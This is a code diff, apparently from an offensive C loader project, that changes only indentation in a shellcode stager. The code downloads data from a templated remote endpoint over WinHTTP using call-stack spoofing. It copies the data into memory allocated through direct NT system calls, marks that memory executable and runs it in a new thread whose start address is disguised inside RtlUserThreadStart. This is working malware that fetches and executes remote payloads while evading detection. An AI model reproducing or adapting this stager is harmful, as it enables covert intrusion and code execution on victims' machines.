@@ -40,7 +40,7 @@ BOOL ReceiveData(
 		dwReqFlags |= WINHTTP_FLAG_SECURE;
 
 
-    hSession = SPOOF(Inst->Transport.WinHttpOpen, Inst->Module.Kernelbase, lpwUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	hSession = SPOOF(Inst->Transport.WinHttpOpen, Inst->Module.Kernelbase, lpwUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	if (hSession == NULL)
 		goto end;
 
@@ -122,25 +122,25 @@ VOID Main(
 	DWORD dwDownloadedDataSize;
 
 	if(!
-    ReceiveData($$SECURE$$, $$PORT$$, (LPWSTR)&endpoint, (LPWSTR)&uri, (LPWSTR)&userAgent, &pDownloadedData, &dwDownloadedDataSize, Inst))
-    {
-        DBREAK;
-        return;
-    }
+	ReceiveData($$SECURE$$, $$PORT$$, (LPWSTR)&endpoint, (LPWSTR)&uri, (LPWSTR)&userAgent, &pDownloadedData, &dwDownloadedDataSize, Inst))
+	{
+		DBREAK;
+		return;
+	}
 
-    PVOID pAllocatedAddr = NULL; 
-    SIZE_T stAllocSize = (SIZE_T)dwDownloadedDataSize;
-    ULONG_PTR ulOldProtect = 0;
+	PVOID pAllocatedAddr = NULL; 
+	SIZE_T stAllocSize = (SIZE_T)dwDownloadedDataSize;
+	ULONG_PTR ulOldProtect = 0;
 
-    void*   regContent[] = { NULL, NULL };
+	void*	regContent[] = { NULL, NULL };
 
-    NTCALL(NtAllocateVirtualMemory, (HANDLE)-1, &pAllocatedAddr, 0, &stAllocSize, MEM_COMMIT, PAGE_READWRITE);
+	NTCALL(NtAllocateVirtualMemory, (HANDLE)-1, &pAllocatedAddr, 0, &stAllocSize, MEM_COMMIT, PAGE_READWRITE);
 
-    xMemcpy(pAllocatedAddr, pDownloadedData, dwDownloadedDataSize);
+	xMemcpy(pAllocatedAddr, pDownloadedData, dwDownloadedDataSize);
 
 	Inst->Win32.LocalFree(pDownloadedData); 
 
-    NTCALL(NtProtectVirtualMemory, (HANDLE)-1, &pAllocatedAddr, &stAllocSize, PAGE_EXECUTE_READ, &ulOldProtect);
+	NTCALL(NtProtectVirtualMemory, (HANDLE)-1, &pAllocatedAddr, &stAllocSize, PAGE_EXECUTE_READ, &ulOldProtect);
 
 	HANDLE hThread = NULL;
 	NTCALL(NtCreateThreadEx, &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess, (U_PTR(Inst->Win32.RtlUserThreadStart) + 0x21), (void*)NULL, (void*)TRUE, (void*)0, (void*)0, (void*)0, (void*)NULL ) ;
